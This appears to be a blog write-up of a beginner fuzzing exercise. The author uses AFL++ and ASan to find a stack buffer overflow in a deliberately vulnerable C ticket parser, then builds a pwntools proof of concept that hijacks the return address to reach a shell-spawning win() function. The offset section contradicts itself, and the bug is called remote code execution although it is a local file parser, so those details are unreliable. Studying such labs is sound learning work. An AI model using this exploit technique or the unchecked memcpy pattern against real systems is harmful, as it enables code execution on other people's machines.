---
title: 'Fuzzing: stack buffer overflow in ticket parser'
date: 2026-07-09
description: 'First fuzzing exercise: used AFL++ and ASan to find and exploit a stack buffer overflow in a custom C program, hijacking RIP to reach a win() function.'
thumbnail: thumbnail.png
draft: false
---

## Introduction

This is my first time using a fuzzer. I'm aware that this is easily exploitable by hand, however I want to become familiar with fuzzing and practice the workflow.

## Summary

The bug is a buffer overflow in the `process_ticket` function. `memcpy` blindly copies length-unrestricted data into a 64-byte buffer. This leads to full control over `RIP` and therefore allows remote code execution.

## Target

The target program:

```c
// ticket.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win(void) {
    printf("=== ACCESS GRANTED ===\n");
    printf("You hit the win function via controlled EIP/RIP!\n");
    system("/bin/sh");
}

typedef struct {
    unsigned int magic;
    unsigned int length;
} ticket_header_t;

void process_ticket(char *data, unsigned int length) {
    char buffer[64];
    printf("[*] Processing ticket, claimed length: %u\n", length);
    memcpy(buffer, data, length);
    printf("[*] Ticket content: %.64s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <ticket_file>\n", argv[0]);
        return 1;
    }

    FILE *fp = fopen(argv[1], "rb");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    ticket_header_t header;
    if (fread(&header, sizeof(header), 1, fp) != 1) {
        printf("Invalid header\n");
        fclose(fp);
        return 1;
    }

    if (header.magic != 0xC0FFEE) {
        printf("Bad magic\n");
        fclose(fp);
        return 1;
    }

    char *data = malloc(header.length + 1);
    if (fread(data, 1, header.length, fp) != header.length) {
        printf("Truncated ticket data\n");
        free(data);
        fclose(fp);
        return 1;
    }
    data[header.length] = '\0';

    process_ticket(data, header.length);

    free(data);
    fclose(fp);
    return 0;
}
```

Compiled with `gcc -fno-stack-protector -no-pie -o ticket ticket.c` to disable the stack canary and PIE for this exercise, since the goal was to learn the workflow, not to bypass modern mitigations.

## Vulnerability Details

### Root Cause

As mentioned above, the root cause is the `memcpy` call (line 21), which copies data into a 64-byte buffer without validating the length.

The program reads a binary file as an argument, verifies the header, and then reads the specified amount of data. If the header is valid, it prints the claimed length and the ticket data. Therefore, the binary file needs to have the following format:

```text
magic:  0xC0FFEE   // 4 bytes, little-endian
length: x          // 4 bytes, little-endian
data:   y          // [length bytes] of data
```

### Affected Code

```c
void process_ticket(char *data, unsigned int length) {
    char buffer[64];
    printf("[*] Processing ticket, claimed length: %u\n", length);
    memcpy(buffer, data, length);
    printf("[*] Ticket content: %.64s\n", buffer);
}
```

## Discovery Process

### Fuzzing Setup

First, I wrote a Python script that generates a valid ticket, which serves as the initial seed.

```python
import struct

with open("valid_ticket.bin", "wb") as f:
    f.write(struct.pack("<II", 0xC0FFEE, 10))
    f.write(b"HELLOWORLD")
```

```bash
mkdir input
python3 build_ticket.py
rm build_ticket.py
```

After that, I compiled `ticket.c` with AddressSanitizer enabled:

```bash
AFL_USE_ASAN=1 afl-clang-fast -o ticket_fuzz ticket.c
```

Next, I started fuzzing:

```bash
AFL_SKIP_CPUFREQ=1 afl-fuzz -i input -o output -- ./ticket_fuzz @@
```

### Crash Triage

I got a crash pretty quickly, so I investigated it. AFL++ stores crashes in `output/default/crashes`.

I reproduced the crash:

```bash
./ticket_fuzz output/default/crashes/'id:000000,sig:06,src:000000,time:62,execs:28,op:(null),pos:0'
```

As we can see, ASan reports a **stack-buffer-overflow**, confirming that the program writes beyond the bounds of the local buffer.

## Exploitation

### Stack Layout / Offset Calculation

Since we now know that we have a buffer overflow, we can calculate the offset.

Because the binary was compiled without stack protection (`-fno-stack-protector -no-pie`), the stack layout of `process_ticket` after the function prologue looks like this:

```text
buffer:          64 bytes
saved RBP:        8 bytes
return address:   8 bytes
```

This gives an offset of `64 + 8 = 72` bytes to reach the return address.

This was confirmed empirically by disassembling the function prologue:

```asm
push rbp
mov rbp, rsp
sub rsp, 0x50
; 80 bytes reserved for locals (buffer + padding)
```

and by testing with a payload of `72 x 'A' + 8 x 'B'`, which corrupted the saved `RBP` (visible as `0x4242424242424242` in the crash) while leaving `RIP` unchanged. This confirms that the return address begins exactly 8 bytes later, at offset 72.

### Exploit Development / PoC

Since this exercise includes a `win()` function, we can simply overwrite the return address with the address of `win()`. The payload still requires a valid ticket header.

The payload consists of:

- a valid header,
- 64 bytes to fill the buffer,
- 8 bytes to overwrite the saved `RBP`,
- the address of `win()` to overwrite the return address.

```python
from pwn import *
import struct

payload = b"A" * 64 + b"B" * 8 + p64(0x401256)
header = struct.pack("<II", 0xC0FFEE, len(payload))

with open("exploit_ticket.bin", "wb") as f:
    f.write(header + payload)

print("Done")
```

To generate the exploit, run:

```bash
python3 exploit_build.py
```

This creates `exploit_ticket.bin`.

Then execute:

```bash
./ticket exploit_ticket.bin
```

which redirects execution to `win()` and spawns a shell.

## Impact

An attacker can achieve arbitrary code execution if the binary is compiled without modern exploit mitigations such as stack canaries and PIE.
In a real-world application, the impact depends on the available exploit mitigations. Without stack canaries and PIE, redirecting execution to existing code is straightforward. With modern mitigations enabled, successfully exploiting the vulnerability typically requires additional techniques, such as leaking memory addresses or building a ROP chain.
